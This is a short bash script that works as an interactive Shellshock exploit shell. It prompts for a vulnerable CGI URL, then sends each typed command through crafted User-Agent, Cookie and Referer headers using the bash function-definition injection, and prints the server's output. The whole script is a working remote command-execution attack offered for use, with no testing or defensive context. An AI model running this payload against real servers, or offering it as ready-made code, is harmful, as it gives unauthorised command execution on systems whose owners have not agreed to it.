#!/bin/bash

#Color is happyness
RED="\033[01;31m"                                                                                
GREEN="\033[01;32m"                                                                              
YELLOW="\033[01;33m" 
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

read -p "Enter the vulnerable url: " url

#url=http://shellshock-vulnerable.com/cgi-bin/status

echo -e "${green}Enter your command: "
while read cmd
do
   content=$(curl -s -H "User-Agent: () { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H "Cookie: () { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -H "Referer: () { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
   echo ${red}$content
   echo "${reset}__________________________________________________________________" ;
   echo -e "${green}Enter a command: ${YELLOW}";
done
